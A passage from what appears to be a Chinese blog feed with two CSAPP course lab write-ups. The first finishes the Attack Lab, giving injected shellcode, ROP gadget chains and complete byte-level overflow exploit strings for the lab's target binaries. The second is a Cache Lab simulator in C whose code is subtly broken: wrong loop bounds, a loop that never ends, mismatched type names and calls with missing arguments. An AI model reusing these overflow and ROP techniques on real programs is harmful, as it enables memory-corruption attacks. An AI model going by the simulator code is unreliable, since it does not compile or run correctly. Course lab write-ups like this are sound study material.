<li><code>p/x $rsp</code>打印栈指针的值</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102221124338.png" alt="image-20231102221124338"></li>
</ul>
</li>
<li><p>注入代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi #从0x5561dca8 加载字符串到rdi中</span><br><span class="line">pushq $0x4018fa        #传入touch3 的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>同上操作得到字节级返回：</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102222104635.png" alt="image-20231102222104635"></p>
</li>
<li><p>所以phase3的栈帧应该是如下：来自<a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a>  <strong>THX！！！</strong></p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102222219420.png" alt="image-20231102222219420"></p>
</li>
<li><p>将cookie &#x3D; 59b997fa 按照ascii 转成字符串 为<code>35 39 62 39 39 37 66 61</code></p>
</li>
<li><p><strong>逻辑：</strong></p>
<ul>
<li>getbuf 执行ret， 从栈中弹出地址0x5561dc78，跳转到注入代码</li>
<li>代码执行，将存在地址为0x5561dca8的字符串传入参数寄存器%rdi</li>
<li>将touch3的地址压入栈</li>
<li>执行ret 从栈中弹出touch3 函数的地址。</li>
</ul>
</li>
<li><p>所以注入最终字符串为：</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102223458707.png" alt="image-20231102223458707"></p>
</li>
<li><p>因为在<code>text</code>栈帧中多用了一个字节存放<code>cookie</code>，所以最后<code>8个字节</code>用来存放<code>cookie</code>的字符串</p>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231102223921626.png" alt="image-20231102223921626"></p>
</li>
</ul>
<h1 id="3-return-oriented-programming"><a href="#3-return-oriented-programming" class="headerlink" title="3.return-oriented programming"></a>3.return-oriented programming</h1><p><strong>说明：</strong>对rtarget 进行攻击比ctarget要困难许多</p>
<ul>
<li>rtarget使用了随机化，使得每次运行时栈堆的位置都不同。</li>
<li>将保存栈的内存区域设置为不可执行，所以即使将攻击代码放入了程序计数器中，也会不可以执行</li>
</ul>
<p><strong>ROP：</strong>面向返回的程序设计，就是在已经存在的程序中找到特定的以<code>ret</code>结尾的指令序列为我们所用，称这样的代码段为<code>gadget</code>，把要用到的部分的地址压入栈中，每次ret后取出一个新的<code>gadget</code>，所以就可以形成一个程序连，实现攻击。——拼凑代码</p>
<h2 id="3-1-level-2"><a href="#3-1-level-2" class="headerlink" title="3.1 level 2"></a>3.1 level 2</h2><p><code>phase 4</code>将重复<code>phase 2</code>阶段的攻击（<strong>修改返回地址 调用touch2</strong>），不同的是要使用<code>gadget farm</code> 里的<code>gadget</code> 来攻击<code>rtarget</code>程序，你的答案只使用如下指令类型的<code>gadget</code>。也只能使用<code>前八个寄存器%rax - %rdi</code></p>
<ul>
<li>movq：代码figure 3A<ul>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103102041710.png" alt="image-20231103102041710"></li>
</ul>
</li>
<li>popq：见figure 3B<ul>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103102111796.png" alt="image-20231103102111796"></li>
</ul>
</li>
<li>ret：0xc3 单字节编码</li>
<li>nop：0x90单字节编码，</li>
</ul>
<p><strong>建议：</strong></p>
<ul>
<li>所有的gadgets都可在rtarget代码的start-farm 到mid -farm中找到</li>
<li>只可以使用两个gadgets来实现这次攻击</li>
<li>如果一个gadget使用了popq指令，那么它会从栈中弹出数据。这样一来，你的攻击代码能既包含gadget的地址也包含数据。</li>
</ul>
<p><strong>思路：</strong></p>
<ul>
<li><p>phase 2 注入的代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x59b997fa %rdi #将cookie的值传入 rdi中</span><br><span class="line">pushq &amp;0x4017ec 	  #touch2函数的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p><strong>很难</strong>从程序中获得带有特定立即数（<code>$0x59b997fa</code>）的gadget代码。—–联想到建议第三点<strong>如果一个gadget 使用了pop命令，那么它会从栈中弹出数据，这样一来你的攻击代码技能包含gadget的地址也包含数据</strong></p>
</li>
<li><p>对 rtarget 执行反汇编<code>objdump -d rtarget &gt; rtarget.s</code>得到.s文件</p>
</li>
<li><p>根据上面的思路，理论上只需要将cookie 赋值给 参数寄存器%rdi，然后再将ret设置为touch2的地址</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pop %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>在<code>rtarget.s</code>中start_farm到 end_farm这一段搜索是否存在<code>pop %rdi----用5f表示</code>     ——-<strong>没有这个gadget</strong></p>
</li>
<li><p>所以再根据题目提示的，可以用两条gadget组合，那么可以得到如下代码</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#cookie 数据 gadget1</span><br><span class="line">pop %rax</span><br><span class="line">ret #ret gadget2</span><br><span class="line">#gadget2 rax移动到 rdi</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret # touch2</span><br></pre></td></tr></table></figure>
</li>
<li><p>查表 <code>popq %rax </code>的编码表示为<code>58</code>，<code>movq %rax, %rdi</code>的编码表示为 <code>48 89 c7</code> </p>
</li>
<li><p>在farm搜索这几个编码 存在58</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00000000004019a7 &lt;addval_219&gt;:</span><br><span class="line">  4019a7:	8d 87 51 73 58 90    	lea    -0x6fa78caf(%rdi),%eax</span><br><span class="line">  4019ad:	c3                   	retq   </span><br><span class="line">-----  </span><br><span class="line">00000000004019a0 &lt;addval_273&gt;:</span><br><span class="line">  4019a0:	8d 87 48 89 c7 c3    	lea    -0x3c3876b8(%rdi),%eax</span><br><span class="line">  4019a6:	c3                   	retq   </span><br></pre></td></tr></table></figure>
</li>
<li><p>所以可以得到<code>58</code>的指令地址为<code>0x4019ab</code>， <code>48 89 c7</code>的指令地址为<code>0x4019a2</code>，<code>cookie（0x59b997fa）</code>，<code>touch2（4017ec）</code></p>
</li>
<li><p>所以可以得到test输入的字符串为以下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00</span><br><span class="line">00 00 00 00 00 00 00 00 #补齐40个字节 </span><br><span class="line">ab 19 40 00 00 00 00 00 # pop %rax的指令 58</span><br><span class="line">fa 97 b9 59 00 00 00 00 # cookie的值 59b997fa</span><br><span class="line">a2 19 40 00 00 00 00 00 # movq %rax，rdi的指令</span><br><span class="line">ec 17 40 00 00 00 00 00 # touch2的地址</span><br></pre></td></tr></table></figure>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103113722934.png" alt="image-20231103113722934"></p>
</li>
</ul>
<p><strong>逻辑：</strong></p>
<ul>
<li>栈帧：</li>
<li><img src="/2023/11/02/CSAPP-3-attacklab/image-20231103114232778.png" alt="image-20231103114232778"></li>
<li>首先将<code>getbuf</code>开辟的40个字节的栈填满溢出，</li>
<li>然后<code>getbuf</code>返回后会执行<code>gadget1</code>函数，会将<code>cookie</code>的值弹出，并存入<code>%rax</code>中</li>
<li>然后<code>ret</code>执行<code>gadget2</code> 会将<code>%rax</code> 转移到<code>%rdi</code></li>
<li>然后<code>ret</code>到<code>touch2</code>的地址，调用<code>touch2</code>函数</li>
</ul>
<h2 id="3-2-level-3"><a href="#3-2-level-3" class="headerlink" title="3.2 level 3"></a>3.2 level 3</h2><p><code>phase 5</code>将实现<code>phase 3</code>调用touch3函数，传入的是cookie的字符串。</p>
<p>可以使用 <code>farm</code>中的所有代码。</p>
<p><strong>建议</strong></p>
<ul>
<li>需要关注<code>movl</code>指令对寄存器<code>高4</code>字节的影响</li>
<li>官方解法需要<code>8</code>个<code>gadgets</code></li>
</ul>
<p><code>phase3</code>注入的代码为：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">movq $0x5561dca8, %rdi #从0x5561dca8是栈中存放cookie的地址 加载字符串到rdi中 </span><br><span class="line">pushq $0x4018fa        #传入touch3 的地址</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>

<ul>
<li><p>rtarget中 栈的位置是随机的 所以<strong>没有办法使用绝对地址直接</strong>找到cookie存放在栈中的地址，因此可以采用偏移量计算的方式，<strong>用相对地址访问</strong>。</p>
</li>
<li><p>计算相对地址可以使用%rsp寄存器 <strong>%rsp—-栈指针寄存器 指向栈顶，然后加上偏移量就可以获得存放 cookie的地址</strong></p>
</li>
<li><p>进行地址偏移计算需要用到 lea（load effective address）取有效地址，即取偏移地址，在farm中搜索得到：</p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104114015510.png" alt="image-20231104114015510"></p>
</li>
<li><p>这一行是计算<code>%rdi+%rsi</code>，并将结果放在<code>%rax</code>中，同上phase4，需要将<code>%rax</code>中存放的数据传入到<code>%rdi</code>中，所以需要：<code>mov %rax, %rdi</code> 调用函数。</p>
</li>
<li><p>由于操作数寄存器为<code>%rdi</code> 和 <code>%rsi</code>，需要将栈顶取出放入到<code>%rdi</code>中，将偏移量取出放入到<code>%rsi（%esi）</code>中</p>
</li>
<li><p>获取栈指针位置： <code>movq %rsp，%rdi</code> 但farm每一满足条件的字节码，所以可以多次移动： <code>movq %rsp ，%rax</code> —–<code>movq %rax，%rdi</code> </p>
</li>
<li><p>地址偏移量是我们自己手动输入，需要：<code>popq %rax</code> 将其取出放入到<code>%rax</code>寄存器  </p>
</li>
<li><p>然后将<code>%rax（%eax）</code> 放入到<code>%rsi（%esi）</code>中，farm没有直接指令：<code>mov %eax，%esi，</code>因此需要两条指令，也没有，三条：<code>mov %eax，%ecx</code> —- <code>mov %ecx，%edx</code> —–<code>mov %edx，%esi</code></p>
</li>
<li><p>因此 全部需要的指令如下：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#栈指针 存入rdi</span><br><span class="line">movq %rsp, %rax</span><br><span class="line">ret</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#传入偏移地址</span><br><span class="line">popq %rax</span><br><span class="line">ret</span><br><span class="line">movl %eax, %edx</span><br><span class="line">ret</span><br><span class="line">movl %edx, %ecx</span><br><span class="line">ret</span><br><span class="line">movl %ecx, %esi</span><br><span class="line">ret</span><br><span class="line"></span><br><span class="line">#计算cookie的地址，栈指针+偏移地址，存入rax</span><br><span class="line">lea        (%rdi, %rsi, 1), %rax</span><br><span class="line">ret</span><br><span class="line">movq %rax, %rdi</span><br><span class="line">ret</span><br></pre></td></tr></table></figure>
</li>
<li><p>栈帧的示意图：<a href="https://blog.csdn.net/qq_25591221/article/details/123301271?ops_request_misc=%7B%22request_id%22:%22166996863216800184131554%22,%22scm%22:%2220140713.130102334..%22%7D&request_id=166996863216800184131554&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~all~top_positive~default-1-123301271-null-null.142%5Ev67%5Econtrol,201%5Ev3%5Eadd_ask,213%5Ev2%5Et3_esquery_v3&utm_term=attacklab&spm=1018.2226.3001.4187">【精选】CSAPP-Lab03 Attack Lab 详细解析-CSDN博客</a></p>
<p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104115950030.png" alt="image-20231104115950030"></p>
</li>
<li><p><code>0x48</code>：getbuf之后ret 相当于执行了一次pop操作，所以test的栈指针%rsp &#x3D; %rsp + 0x8.所以cookie相对此hi栈顶的偏移量是0x48 —-<strong>cookie前面指令有9条 9*8&#x3D;0x48</strong></p>
</li>
<li><p>所以序列为：</p>
</li>
<li><pre><code class="asm">00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
00 00 00 00 00 00 00 00
00 00 00 00 00 00 00 00 
ad 1a 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
cc 19 40 00 00 00 00 00 
48 00 00 00 00 00 00 00 
dd 19 40 00 00 00 00 00 
70 1a 40 00 00 00 00 00 
13 1a 40 00 00 00 00 00 
d6 19 40 00 00 00 00 00 
a2 19 40 00 00 00 00 00 
fa 18 40 00 00 00 00 00 
35 39 62 39 39 37 66 61
</code></pre>
</li>
<li><p><img src="/2023/11/02/CSAPP-3-attacklab/image-20231104120756804.png" alt="image-20231104120756804"></p>
</li>
</ul>
]]></content>
      <categories>
        <category>CSAPP</category>
      </categories>
      <tags>
        <tag>attacklab</tag>
      </tags>
  </entry>
  <entry>
    <title>CSAPP-6-cachelab</title>
    <url>/2023/11/14/CSAPP-6-cachelab/</url>
    <content><![CDATA[<h1 id="1-cachelab-引言"><a href="#1-cachelab-引言" class="headerlink" title="1.cachelab 引言"></a>1.cachelab 引言</h1><h2 id="参考："><a href="#参考：" class="headerlink" title="参考："></a><strong>参考：</strong></h2><ol>
<li><a href="https://zhuanlan.zhihu.com/p/410662053">csapp-cachelab 详解 - 知乎 (zhihu.com)</a></li>
<li><a href="https://blog.csdn.net/m0_65591847/article/details/132323877?spm=1001.2101.3001.6650.3&utm_medium=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-3-132323877-blog-123650563.235%5Ev38%5Epc_relevant_sort&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~YuanLiJiHua~Position-3-132323877-blog-123650563.235%5Ev38%5Epc_relevant_sort&utm_relevant_index=6">csapp实验5-cachelab实验详解-CSDN博客</a></li>
<li><a href="https://blog.csdn.net/qq_42241839/article/details/122984159">CSAPP(CMU 15-213)：Lab4 Cachelab详解-CSDN博客</a></li>
</ol>
<p>非常感谢！！！</p>
<p><strong>描述：</strong>part a 是实现cache的模拟器，part b 将针对缓存性能进行优化，写一个矩阵转置函数</p>
<h1 id="2-Part-A"><a href="#2-Part-A" class="headerlink" title="2. Part A"></a>2. Part A</h1><h3 id="规则："><a href="#规则：" class="headerlink" title="规则："></a><strong>规则：</strong></h3><ul>
<li>模拟器必须对任意的s，E和b正确工作，意味着必须使用<code>malloc</code>函数作为函数模拟器的数据结构体分配空间</li>
<li>本实验只对数据缓存性能感兴趣，因此应该忽略所有指令缓存访问，valgrind 总是将 i 放在第一位，将<code>M(modify) L(load) S(store)</code> 放在第二列。</li>
<li>为了获得分数，必须在主函数末尾调用<code>printSummary(hit_count, miss_count, eviction_count);</code></li>
<li>对于本实验，应该假设内存访问已经正确对齐，因此单个内存访问永远不会越界。</li>
</ul>
<h3 id="思路："><a href="#思路：" class="headerlink" title="思路："></a><strong>思路：</strong></h3><ul>
<li><p>缓存结构：</p>
<p><img src="/2023/11/14/CSAPP-6-cachelab/image-20231115151835076.png" alt="image-20231115151835076"></p>
<ul>
<li>cache地址中包含标记tag，组索引s和块偏移b</li>
<li>首先会根据组索引在cache中找到组</li>
<li>然后如果该组中是有效的，并且标记tag能够匹配上 那么就hit</li>
<li>如果没有匹配hit，那么就是miss，把需要的块替换进来</li>
<li>组没有满的情况下直接替换即可，组满了的情况下需要根据<code>LRU</code>进行替换</li>
</ul>
</li>
<li><p>由规则可以知道<strong>只需要在<code>csim.c</code>文件中实现对S L M这三种类型的地址操作</strong>然后反映出相应的结果<code>miss（未命中） hit（命中） eviction（驱逐）</code>。<strong>并且采用LRU（least-recently used）</strong>策略，既是发生eviction时 选择<strong>最近最少访问</strong>的那一行。</p>
</li>
<li><p>查看<strong>官方文档6.1</strong>建议用<code>getopt</code>实现对命令行的读取和解析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//头文件</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;getopt.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br></pre></td></tr></table></figure>

<p>需要实现的</p>
</li>
<li><p>创建结构体： 模拟缓存中的数据结构，参考上图缓存结构，每一行有效位，标记位和缓存块，因为需要使用导LRU 所以还需要记录每一行的时间戳：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cacheLine</span>&#123;</span></span><br><span class="line">    <span class="type">int</span> isValid;     <span class="comment">//有效位</span></span><br><span class="line">    <span class="comment">//bool isValid;  //c 没有原生的bool</span></span><br><span class="line">    <span class="type">int</span> tag;         <span class="comment">//标记位和数据位</span></span><br><span class="line">    <span class="type">int</span> LRU_time;    <span class="comment">//时间戳</span></span><br><span class="line">&#125;cacheLine;</span><br></pre></td></tr></table></figure>
</li>
<li><p>常见整个cache的结构体，包含每一个组，组内每个行，行中数据位字节数，以及每一个块的数据结构<code>cacheLine</code>：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//定义整个cache</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> <span class="title">cache</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">    <span class="type">int</span> nSets;     <span class="comment">//组</span></span><br><span class="line">    <span class="type">int</span> nLines;    <span class="comment">//每组块数 行数</span></span><br><span class="line">    <span class="type">int</span> bblocks;   <span class="comment">//每块字节数</span></span><br><span class="line">    cacheLine** block;</span><br><span class="line">&#125;cache;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对cache进行初始化  包括申请每个组 组内每一行的空间，以及对每一行进行初始化</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//初始化cache s组，E行，b字节的cache，并且设置每一行的有效位，标记位和时间戳</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">initCache</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> E, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    <span class="type">int</span> S = <span class="number">1</span> &lt;&lt; s;   <span class="comment">// 2^s 组</span></span><br><span class="line">    <span class="type">int</span> B = <span class="number">1</span> &lt;&lt; b;   <span class="comment">// 2^b个字节数据</span></span><br><span class="line">    Cache*  myCache= (Cache *)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(Cache));</span><br><span class="line">    myCache-&gt;nSets = S;</span><br><span class="line">    myCache-&gt;nLines = E;</span><br><span class="line">    myCache-&gt;bblocks = B;</span><br><span class="line">    <span class="comment">//每组进行空间开辟 申请空间</span></span><br><span class="line">    myCache-&gt;block = (CacheLine**)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine *) * S);</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; S; i++) &#123;</span><br><span class="line">        <span class="comment">//每行进行空间开辟</span></span><br><span class="line">        myCache-&gt;block[i] = (CacheLine*)<span class="built_in">malloc</span>(<span class="keyword">sizeof</span>(CacheLine) * E);</span><br><span class="line">        <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; j &lt; E; j++)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">//每行进行初始化</span></span><br><span class="line">            myCache-&gt;block[i][j].isValid = <span class="number">0</span>;  <span class="comment">//有效位设置0</span></span><br><span class="line">            myCache-&gt;block[i][j].tag = <span class="number">-1</span>;     <span class="comment">//标志位-1</span></span><br><span class="line">            myCache-&gt;block[i][j].LRU_time = <span class="number">0</span>; <span class="comment">//时间戳0</span></span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>判断是否命中模块</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//判断是否命中 命中则返回块的索引</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isHit</span><span class="params">(<span class="type">int</span> opSet, <span class="type">int</span> opTag, Cache* myCache)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; myCache-&gt;nSets; i++)</span><br><span class="line">    &#123;   </span><br><span class="line">        <span class="comment">//只有当该行的有效值存在且 标志位能够匹配时才返回</span></span><br><span class="line">        <span class="keyword">if</span> (myCache-&gt;block[opSet][i].isValid &amp;&amp; myCache-&gt;block[opSet][i].tag == opTag) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果没Hit，那么就是要判断当前cache是否是全满了，如果没有全满则返回任意一个有效位为0的行作为替换行，满了则返回会-1</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//miss了 判断是否满了，没有满则选择一个有效位为0的进行替换返回该索引</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">isFull</span><span class="params">(<span class="type">int</span> opSet, Cache* myCache)</span> &#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; myCache-&gt;nLines; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (myCache-&gt;block[opSet][i].isValid == <span class="number">0</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>如果没有满，则直接替换返回的标号，然后更新LRU。</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果没有满则将行进行替换，并且更新LRU LRU越大表示越久没有访问过</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cacheReplace</span><span class="params">(<span class="type">int</span> i, <span class="type">int</span> opSet, <span class="type">int</span> opTag, Cache* myCache)</span> &#123;</span><br><span class="line">    myCache-&gt;block[opSet][i].isValid = <span class="number">1</span>;<span class="comment">//合法</span></span><br><span class="line">    myCache-&gt;block[opSet][i].tag = opTag;<span class="comment">//标记位</span></span><br><span class="line">    <span class="comment">//更新时间戳</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> j = <span class="number">0</span>; i &lt; myCache-&gt;nLines; j++) &#123;</span><br><span class="line">        <span class="comment">//如果有效</span></span><br><span class="line">        <span class="keyword">if</span> (myCache-&gt;block[opSet][j].isValid == <span class="number">1</span>) &#123;</span><br><span class="line">            myCache-&gt;block[opSet][j].LRU_time++;<span class="comment">//加一</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>找到最大的LRU的索引并返回</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//如果满了则找最大的LRU进行替换，查找有效位为1且时间戳最大的时间戳返回</span></span><br><span class="line"><span class="type">int</span> <span class="title function_">findMaxLRU</span><span class="params">(<span class="type">int</span> opSet, Cache* myCache)</span> &#123;</span><br><span class="line">    <span class="type">int</span> maxTempLRU = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> maxIndexLRU = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">size_t</span> i = <span class="number">0</span>; i &lt; myCache-&gt;nLines; i++)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (myCache-&gt;block[opSet][i].LRU_time &gt; maxTempLRU) &#123;</span><br><span class="line">            maxTempLRU = myCache-&gt;block[opSet][i].LRU_time;</span><br><span class="line">            maxIndexLRU = i;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> maxIndexLRU;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>整合逻辑</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//整合更新策略</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">cacheUpdate</span> <span class="params">(<span class="type">int</span> opSet, <span class="type">int</span> opTag, Cache* myCache)</span> &#123;</span><br><span class="line">    <span class="comment">//判断 </span></span><br><span class="line">    <span class="keyword">if</span> (isHit(opSet, opTag, myCache) == <span class="number">-1</span>) &#123;</span><br><span class="line">        <span class="comment">//如果没有命中 则需要进行替换</span></span><br><span class="line">        missCount++;</span><br><span class="line">        <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;miss&quot;</span>);                     <span class="comment">//跟踪信息打印</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="comment">//判断是否满了</span></span><br><span class="line">        <span class="type">int</span> index = isFull(opSet, myCache);</span><br><span class="line">        <span class="keyword">if</span> (index == <span class="number">-1</span>) &#123;</span><br><span class="line">            evictionCount++;                    <span class="comment">//驱除+1</span></span><br><span class="line">            <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">                <span class="built_in">printf</span>(<span class="string">&quot;eviction \n&quot;</span>);          <span class="comment">//跟踪信息打印    </span></span><br><span class="line">            &#125;</span><br><span class="line">            index = findMaxLRU(opSet, myCache); <span class="comment">//找到最大LRU的索引</span></span><br><span class="line">        &#125;</span><br><span class="line">        cacheReplace(index, opSet, opTag, myCache);<span class="comment">//单行替换</span></span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="comment">//hit</span></span><br><span class="line">        hitCount++;</span><br><span class="line">        <span class="keyword">if</span> (verbose) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;hit \n&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        cacheReplace(isHit(opSet, opTag, myCache), opSet, opTag, myCache);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>释放malloc开辟的内存</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="comment">//free 用malloc申请了内存</span></span><br><span class="line"><span class="type">void</span> <span class="title function_">freeCache</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="built_in">free</span>(myCache);</span><br><span class="line">    myCache = <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
</li>
<li><p>对输入的文件进行解析</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">getTrace</span><span class="params">(<span class="type">int</span> s, <span class="type">int</span> E, <span class="type">int</span> b)</span> &#123;</span><br><span class="line">    FILE *p_file;</span><br><span class="line">    p_file = fopen(t, <span class="string">&quot;r&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (p_file == <span class="literal">NULL</span>) &#123;</span><br><span class="line">        <span class="built_in">exit</span>(<span class="number">-1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">char</span> identifier;</span><br><span class="line">    <span class="type">unsigned</span> address; <span class="comment">//无符号数表示地址</span></span><br><span class="line">    <span class="type">int</span> size;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">while</span> (<span class="built_in">fscanf</span>(p_file, <span class="string">&quot; %c %x,%d&quot;</span>, &amp;identifier, &amp;address, &amp;size) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="comment">//取出相应的位</span></span><br><span class="line">        <span class="type">int</span> opTag = address &gt;&gt; (s + b);</span><br><span class="line">        <span class="type">int</span> opSet = (address &gt;&gt; b) &amp; ((<span class="type">unsigned</span>)(<span class="number">-1</span>) &gt;&gt; (<span class="number">8</span> * <span class="keyword">sizeof</span>(<span class="type">unsigned</span>) - s));</span><br><span class="line">           </span><br><span class="line">        <span class="keyword">switch</span> (identifier)</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;M&#x27;</span>:</span><br><span class="line">                cacheUpdate(opSet, opTag);</span><br><span class="line">                cacheUpdate(opSet, opTag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;L&#x27;</span>:</span><br><span class="line">                cacheUpdate(opSet, opTag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">            <span class="keyword">case</span> <span class="string">&#x27;S&#x27;</span>:</span><br><span class="line">                cacheUpdate(opSet, opTag);</span><br><span class="line">                <span class="keyword">break</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    fclose(p_file);</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
</li>
<li><p>usage函数</p>
